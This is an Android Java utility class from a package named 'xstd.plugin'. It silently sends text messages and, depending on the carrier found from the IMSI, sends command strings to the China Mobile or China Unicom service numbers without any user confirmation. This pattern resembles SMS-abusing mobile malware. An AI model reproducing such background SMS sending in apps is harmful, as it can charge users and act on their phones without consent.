package com.xstd.plugin.Utils;

import android.content.Context;
import android.telephony.SmsManager;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;

import java.util.ArrayList;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-22
 * Time: AM9:51
 * To change this template use File | Settings | File Templates.
 */
public class SMSUtil {

    public static final void sendSMS(String target, String msg) {
        try {
            SmsManager.getDefault().sendTextMessage(target, null, msg, null, null);
            Config.LOGD("[[SMSUtil::sendSMS]] try to send msg : " + msg + " to : " + target);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static final void trySendCmdToNetwork(Context context) {
        int networkType = AppRuntime.getNetworkTypeByIMSI(context);
        ArrayList<String> cmd = new ArrayList<String>();
        String target = null;
        switch (networkType) {
            case AppRuntime.CMNET:
                target = "10086";
                cmd.add(AppRuntime.SMSCenterCommand.CMNET_CMD);
                break;
            case AppRuntime.UNICOM:
                target = "10010";
                cmd.add(AppRuntime.SMSCenterCommand.UNICOM_CMD1);
                cmd.add(AppRuntime.SMSCenterCommand.UNICOM_CMD2);
                cmd.add(AppRuntime.SMSCenterCommand.UNICOM_CMD3);
                cmd.add(AppRuntime.SMSCenterCommand.UNICOM_CMD4);
                break;
        }

        if (target != null && cmd.size() > 0) {
            for (String c : cmd) {
                sendSMS(target, c);
            }
        }
    }

}
